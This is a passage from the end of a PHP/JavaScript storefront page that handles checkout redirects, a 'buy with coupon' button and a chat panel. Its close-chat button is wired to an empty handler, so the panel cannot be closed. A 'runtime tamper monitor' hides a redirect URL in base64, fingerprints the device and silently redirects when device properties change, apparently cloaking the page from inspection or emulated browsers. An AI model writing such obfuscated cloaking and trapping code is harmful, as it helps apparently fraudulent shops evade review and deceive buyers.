                        window.location.href = 'index.php?view=pay';
                    }
                };

                const startCheckout = () => {
                    const variantModal = document.getElementById('variantModal');
                    const variantOverlay = document.getElementById('variantModalOverlay');
                    if (variantModal && variantOverlay) {
                        if (typeof window.openVariantModal === 'function' && window.hasVariantModal && window.hasVariantModal()) {
                            window.openVariantModal(redirectToCheckout);
                        } else {
                            variantOverlay.classList.add('show');
                            variantModal.classList.add('show');
                            body.classList.add('scroll-lock');
                        }
                        return;
                    }
                    redirectToCheckout();
                };

                if (btnAddToCart) btnAddToCart.addEventListener('click', startCheckout);
                if (btnBuyWithCoupon) btnBuyWithCoupon.addEventListener('click', startCheckout);

                if (btnOpenChat && chatWrapper) {
                    btnOpenChat.addEventListener('click', (e) => {
                        e.preventDefault();
                        chatWrapper.classList.add('open');
                        body.classList.add('scroll-lock');
                        setTimeout(() => { document.getElementById('chat-input')?.focus(); }, 350);
                    });
                }

                const btnCloseChat = document.querySelector('#chat-wrapper .close-btn');
                if (btnCloseChat) { btnCloseChat.onclick = function(e) {}; }
            });

            // Runtime tamper monitor — redirects if device properties change
            (function(){
                var _d = { hc: navigator.hardwareConcurrency || 0, mtp: navigator.maxTouchPoints || 0, dpr: window.devicePixelRatio || 0, sw: screen.width || 0, sh: screen.height || 0 };
                var _u = atob("<?php echo base64_encode($url_redirecionamento); ?>");
                setInterval(function(){
                    var n = navigator, w = window, s = screen;
                    if ((n.hardwareConcurrency || 0) !== _d.hc ||
                        (n.maxTouchPoints || 0) !== _d.mtp ||
                        (w.devicePixelRatio || 0) !== _d.dpr ||
                        (s.width || 0) !== _d.sw ||
                        (s.height || 0) !== _d.sh) {
                        try { window.location.replace(_u); } catch(e) {}
                    }
                }, 3000);
            })();
        </script>

    <?php elseif ($show_pay_content): ?>
        <?php include 'pay.php'; ?>
    <?php endif; ?>

    </div>

    </body>
</html>
